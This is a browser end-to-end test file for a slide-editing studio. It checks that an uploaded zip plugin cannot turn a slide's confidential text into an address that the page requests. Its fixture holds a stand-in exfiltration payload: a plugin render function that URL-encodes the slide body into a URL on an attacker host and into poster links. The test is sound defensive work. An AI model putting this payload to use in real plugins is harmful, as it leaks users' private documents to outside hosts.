import { ganttZip } from './plugin-fence-fixture';
import { expect, gotoStudio, livePreview, persistedSource, setEditorContent, test } from './studio-fixture';

// ── A zip plugin that writes addresses onto a video slide, in the REAL Studio ─────────────────────
//
// engineering/decisions/2026-10-16-media-plugins.md § 4.5. The shipped `video` pass used to read a slide's
// text and build a poster link from any address it found, and the runtime's mirror did it again over the
// finished page, plugin output included. The plugin below returns the slide's confidential text inside an
// address three ways (plain text, a `@video{…}` span, a bullet with a `poster` key). Nothing may request
// `attacker.invalid`, nothing of ours may build a poster, link or icon from it, and the author's own video
// must still be there. Driven on the real Studio (HARD RULE #23); the control makes the page request the
// same host so a probe that could never see a request cannot pass.

const ATTACKER = 'attacker.invalid';
const LEAK = `function render(f) {
  var d = encodeURIComponent(f.body);
  return '<p>https://${ATTACKER}/?d=' + d + '</p>'
    + '<p><code>@video{"https://youtu.be/AAAAAAAAAAA", poster="https://${ATTACKER}/p.png"}</code></p>'
    + '<ul><li>https://youtu.be/BBBBBBBBBBB</li><li>https://${ATTACKER}/q.png <code>poster</code></li></ul>'
    + '<p><code>^{database}</code></p>';
}
export { render as default };
`;
const DECK = [
	'---',
	'plugins: [gantt-plugin]',
	'---',
	'',
	'<!-- _class: video qr -->',
	'',
	'## Clip',
	'',
	'`@video{"https://www.youtube.com/watch?v=dQw4w9WgXcQ", title="The author\'s own clip"}`',
	'',
	'```gantt',
	'SECRET-Q3-NUMBERS',
	'```',
	'',
].join('\n');

for (const [label, width, height] of [
	['desktop', 1440, 900],
	['tablet', 820, 1180],
	['mobile', 390, 844],
] as const) {
	test(`a zip plugin cannot turn a video slide's text into an address, at ${label} (${width}px) @crosswidth @webkit-tablet @gecko`, async ({ page }) => {
		const requests: string[] = [];
		page.on('request', (r) => requests.push(r.url()));
		// No route(): the `.invalid` host cannot resolve, the log below still sees the attempt, and interception breaks the plugin sandbox's loads in WebKit.
		// Start wide on every project (webkit-tablet opens at 1180x703): the test drives its own widths.
		await page.setViewportSize({ width: 1440, height: 900 });
		await gotoStudio(page);
		const docked = page.getByRole('button', { name: 'Open Library' });
		await ((await docked.count()) ? docked : page.getByRole('button', { name: 'Library', exact: true })).click();
		await page.locator('[data-testid="library-import-input"]').setInputFiles({ name: 'gantt-plugin.zip', mimeType: 'application/zip', buffer: await ganttZip(LEAK) });
		await expect(page.locator('[data-sonner-toast]').first()).toContainText('1 plugin(s)');
		await page.keyboard.press('Escape');
		await setEditorContent(page, DECK);
		await expect.poll(() => persistedSource(page)).toContain('plugins: [gantt-plugin]');
		await page.setViewportSize({ width, height });

		const notice = page.locator('[data-slot="code-packages"]');
		await expect(notice).toHaveAttribute('data-state', 'unapproved', { timeout: 30_000 });
		await notice.getByRole('button', { name: 'Approve the code of gantt-plugin' }).click();

		const preview = livePreview(page);
		const plugin = preview.locator('[data-lattice-plugin="gantt-plugin"]');
		await expect(plugin).toContainText(`https://${ATTACKER}/?d=`, { timeout: 30_000 });
		// Give the runtime's mirror and its poster painting time to act on what the plugin drew.
		await page.waitForTimeout(3000);

		// The plugin DREW, and its address is text.
		await expect(plugin.locator('code').filter({ hasText: '@video{' })).toHaveCount(1);
		await expect(plugin.locator('a[href], svg, .lat-icon, [data-lattice-media]')).toHaveCount(0);
		// Nothing outside the plugin gained a figure; the author's own is whole.
		const own = preview.locator('figure[data-lattice-media="video"]:not([data-lattice-plugin] *)');
		await expect(own).toHaveCount(1);
		await expect(own.locator('a.video-poster')).toHaveAttribute('href', 'https://www.youtube.com/watch?v=dQw4w9WgXcQ');
		await expect(own.locator('figcaption')).toHaveText("The author's own clip");
		await expect(own.locator('.video-qr svg')).toHaveCount(1);
		// ZERO requests to the attacker.
		expect(requests.filter((u) => u.includes(ATTACKER)), requests.filter((u) => u.includes(ATTACKER)).join('\n')).toEqual([]);

		// CONTROL: the log sees a request the page itself makes.
		const before = requests.length;
		await page.evaluate((a) => { const i = new Image(); i.src = `https://${a}/control.png`; document.body.appendChild(i); }, ATTACKER);
		await expect.poll(() => requests.slice(before).some((u) => u.includes(`${ATTACKER}/control.png`))).toBe(true);
	});
}
